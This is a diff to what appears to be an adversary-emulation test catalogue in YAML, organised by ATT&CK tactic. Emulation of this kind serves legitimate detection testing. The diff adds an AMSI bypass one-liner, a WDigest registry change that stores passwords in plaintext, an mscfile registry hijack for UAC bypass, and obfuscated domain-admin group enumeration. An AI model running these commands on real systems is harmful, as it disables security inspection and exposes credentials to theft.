@@ -4885,7 +4885,7 @@ defense-evasion:
           type: path
           default: C:\Windows\System32\cmd.exe
       executor:
-        name: command_prompt
+        name: powershell
         command: |
           New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
           Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
@@ -6000,6 +6000,16 @@ defense-evasion:
         cleanup_command: 'sysmon -i -accepteula
 
 '
+    - name: AMSI Bypass - AMSI InitFailed
+      description: "Any easy way to bypass AMSI inspection is it patch the dll in
+        memory setting the \"amsiInitFailed\" function to true. \nhttps://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n"
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n"
+        cleanup_command: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)\n"
   T1107:
     technique:
       external_references:
@@ -8156,6 +8166,23 @@ defense-evasion:
           ### Garbage collection and closing of ntuser.dat ###
           [gc]::Collect()
           reg unload "HKU\$($ProfileList[$p].SID)"
+    - name: Modify registry for password downgrade to plain text
+      description: "Sets registry key that will tell windows to store plaintext passwords
+        (making the system vulnerable to clear text / cleartext password dumping)
+        \n"
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: 'reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
+          /v UseLogonCredential /t REG_DWORD /d 1 /f
+
+'
+        cleanup_command: 'reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
+          /v UseLogonCredential /t REG_DWORD /d 0 /f
+
+'
   T1170:
     technique:
       external_references:
@@ -11003,7 +11030,7 @@ privilege-escalation:
           type: path
           default: C:\Windows\System32\cmd.exe
       executor:
-        name: command_prompt
+        name: powershell
         command: |
           New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
           Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
@@ -13729,21 +13756,9 @@ discovery:
       - User
       identifier: T1069
     atomic_tests:
-    - name: Permission Groups Discovery
-      description: 'Permission Groups Discovery
-
-'
-      supported_platforms:
-      - macos
-      - linux
-      executor:
-        name: sh
-        command: |
-          dscacheutil -q group
-          dscl . -list /Groups
-          groups
-    - name: Permission Groups Discovery Windows
-      description: 'Permission Groups Discovery for Windows
+    - name: Elevated group enumeration using net group
+      description: 'Runs ''net group'' command including command aliases and loose
+        typing to simulate enumeration/discovery of high value domain groups
 
 '
       supported_platforms:
@@ -13752,25 +13767,10 @@ discovery:
         name: command_prompt
         elevation_required: false
         command: |
-          net localgroup
-          net group /domain
-    - name: Permission Groups Discovery PowerShell
-      description: 'Permission Groups Discovery utilizing PowerShell
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        user:
-          description: User to identify what groups a user is a member of
-          type: string
-          default: administrator
-      executor:
-        name: powershell
-        elevation_required: false
-        command: |
-          get-localgroup
-          get-ADPrinicipalGroupMembership #{user} | select name
+          net group /domai 'Domain Admins'
+          net groups 'Account Operators' /doma
+          net groups 'Exchange Organization Management' /doma
+          net group 'BUILTIN\Backup Operators' /doma
   T1057:
     technique:
       external_references:
